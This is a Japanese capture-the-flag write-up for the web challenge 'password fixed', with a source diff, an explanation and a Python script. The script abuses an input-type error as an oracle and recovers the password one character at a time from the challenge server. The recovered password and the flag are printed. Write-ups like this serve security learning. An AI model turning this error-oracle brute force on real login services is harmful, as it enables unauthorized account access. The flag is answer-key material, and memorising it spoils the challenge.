# password fixed:Web:300pts
```
18,23c18,25
<                       c = "0oO"
<               elif input_pass[i] in "l1I":
<                       c = "l1I"
<               else:
<                       c = input_pass[i]
<               if all([ci != password[i] for ci in c]):
---
>                       if password[i] not in "0oO":
>                               return False
>                       continue
>               if input_pass[i] in "l1I":
>                       if password[i] not in "l1I":
>                               return False
>                       continue
>               if input_pass[i] != password[i]:
```
[http://34.146.80.178:8002/](http://34.146.80.178:8002/)  
[password_fixed.zip](password_fixed.zip)  

# Solution
[password](../password)の修正版らしい。  
先の問題で怪しいと睨んだ部分が無くなっている。  
先ほど作成した[atoz.py](../password/atoz.py)で様々な型を入力して遊んでいると、`[[]]*32`でInternal Server Errorが発生した。  
`["a"]*32`では発生しないため、ローカルで実行してエラーを確認したところ以下のようであった。  
```
~~~
    if input_pass[i] in "0oO":
TypeError: 'in <string>' requires string as left operand, not list
```
空配列に`in`を行おうとして失敗している。  
ここで、`["a",[],[],[],...]`のような場合を考える。  
`"a"`がパスワードでない文字であった場合は`in`での判定に成功してその後の比較で正常終了し、パスワードであった場合次の`[]`を`in`にて判定しようとし異常終了する。  
これによって一文字ずつパスワードを入手できる。  
以下のatozkai.pyで行う。  
```python:atozkai.py
import json
import requests

url = "http://34.146.80.178:8002/flag"

password = [[]]*32

for i in range(32):
    for j in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
        password[i] = j
        data = {"pass":password}
        headers = {"Content-Type":"application/json"}
        response = requests.post(url, data=json.dumps(data), headers=headers)
        if response.status_code != 401:
            if i == 31:
                print("".join(password))
                print(response.text)
            break
```
実行する。  
```bash
$ python atozkai.py
rmWtcmbNUoKPoMECAtYwXKxyoCbbtXNo
nitic_ctf{s0_sh0u1d_va11dat3_un1nt3nd3d_s0lut10n}
```
flagが得られた。  

## nitic_ctf{s0_sh0u1d_va11dat3_un1nt3nd3d_s0lut10n}